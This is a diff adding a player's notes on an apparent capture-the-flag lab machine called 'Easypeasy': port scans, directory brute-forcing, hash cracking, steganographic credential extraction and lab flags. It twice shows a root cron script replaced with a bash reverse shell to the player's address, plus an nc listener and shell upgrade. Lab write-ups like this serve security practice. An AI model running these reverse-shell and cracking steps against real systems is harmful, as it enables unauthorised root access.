@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Easypeasy" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692674885" ts_lastsave="1692697966">
+    <rich_text>nmap -sC -sV -vv -Pn -n -p- 10.10.237.103
+80/tcp open  http    syn-ack nginx 1.16.1
+|_http-server-header: nginx/1.16.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Welcome to nginx!
+
+
+gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.237.103">http://10.10.237.103</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+/hidden               (Status: 301) [Size: 169] [--&gt; </rich_text>
+    <rich_text link="webs http://10.10.237.103/hidden/">http://10.10.237.103/hidden/</rich_text>
+    <rich_text link="webs http://10.10.237.103/hidden/]">]</rich_text>
+    <rich_text>
+
+gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.237.103/hidden/">http://10.10.237.103/hidden/</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+/whatever             (Status: 301) [Size: 169] [--&gt; </rich_text>
+    <rich_text link="webs http://10.10.237.103/hidden/whatever/">http://10.10.237.103/hidden/whatever/</rich_text>
+    <rich_text link="webs http://10.10.237.103/hidden/whatever/]">]</rich_text>
+    <rich_text>
+ZmxhZ3tmMXJzN19mbDRnfQ== - flag{f1rs7_fl4g}		-&gt; 		source code review
+
+
+
+65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Apache2 Debian Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+
+
+gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.237.103:65524/">http://10.10.237.103:65524/</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+/var/www/html/index.html		-		webpage location
+&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu
+ObsJmP173N2X6dOrAgEAL0Vu		-		/n0th1ng3ls3m4tt3r		-		</rich_text>
+    <rich_text link="webs https://www.better-converter.com/Encoders-Decoders/Base62-Decode">https://www.better-converter.com/Encoders-Decoders/Base62-Decode</rich_text>
+    <rich_text>
+flag{9fdafbd64c47471a8f54cd3fc64cd312}		-		source code review
+
+</rich_text>
+    <rich_text link="webs http://10.10.237.103:65524/n0th1ng3ls3m4tt3r/">http://10.10.237.103:65524/n0th1ng3ls3m4tt3r/</rich_text>
+    <rich_text>
+&lt;p&gt;940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81&lt;/p&gt;
+hash-identifer
+john --wordlist=easypeasy.txt --format=gost hash
+mypasswordforthatjob
+
+view-source:</rich_text>
+    <rich_text link="webs http://10.10.237.103:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg">http://10.10.237.103:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg</rich_text>
+    <rich_text>
+steghide info index.jpeg                                                      
+"index.jpeg":
+  format: jpeg
+  capacity: 4.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "secrettext.txt":
+    size: 278.0 Byte
+    encrypted: no
+    compressed: no
+
+cat secrettext.txt 
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+
+password 		-		iconvertedmypasswordtobinary
+
+.mysecretcronjob.sh
+as php is not availble adding php reverse shell is not a solution
+
+#!/bin/bash
+sh -i &gt;&amp; /dev/tcp/10.18.85.195/4444 0&gt;&amp;1
+# i will run as root
+
+nc -nlvp 4444
+python3 -c ‘import pty;pty.spawn("/bin/bash")’
+
+
+</rich_text>
+    <rich_text link="webs http://10.10.237.103:65524/robots.txt">http://10.10.237.103:65524/robots.txt</rich_text>
+    <rich_text>
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+
+</rich_text>
+    <rich_text link="webs https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250">https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250</rich_text>
+    <rich_text>
+a18672860d0510e5ab6699730763b250		-&gt; 		flag{1m_s3c0nd_fl4g}
+
+
+6498/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 304a2b22acd95609f2da122057f46cd4 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf5hzG6d/mEZZIeldje4ZWpwq0zAJWvFf1IzxJX1ZuOWIspHuL0X0z6qEfoTxI/o8tAFjVP/B03BT0WC3WQTm8V3Q63lGda0CBOly38hzNBk8p496scVI9WHWRaQTS4I82I8Cr+L6EjX5tMcAygRJ+QVuy2K5IqmhY3jULw/QH0fxN6Heew2EesHtJuXtf/33axQCWhxBckg1Re26UWKXdvKajYiljGCwEw25Y9qWZTGJ+2P67LVegf7FQu8ReXRrOTzHYL3PSnQJXiodPKb2ZvGAnaXYy8gm22HMspLeXF2riGSRYlGAO3KPDcDqF4hIeKwDWFbKaOwpHOX34qhJz
+|   256 bf86c9c7b7ef8c8bb994ae0188c0854d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8/fLeNoGv6fwAVkd9oVJ7OIbn4117grXfoBdQ8vY2qpkuh30sTk7WjT+Kns4MNtTUQ7H/sZrJz+ALPG/YnDfE=
+|   256 a172ef6c812913ef5a6c24034cfe3d0b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNgw/EuawEJkhJk4i2pP4zHfUG6XfsPHh6+kQQz3G1D
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+username		-		boring
+password 		-		iconvertedmypasswordtobinary
+
+linpeas.sh 
+
+.mysecretcronjob.sh
+as php is not availble adding php reverse shell is not a solution
+
+#!/bin/bash
+sh -i &gt;&amp; /dev/tcp/10.18.85.195/4444 0&gt;&amp;1
+# i will run as root
+
+nc -nlvp 4444
+python3 -c ‘import pty;pty.spawn("/bin/bash")’
+
+
+
+wappalizer -&gt; nginx 1.16.1
+
+
+steghide info Desktop/lost-places-1928727_960_720.jpg
+passphrase required</rich_text>
+  </node>
+</cherrytree>
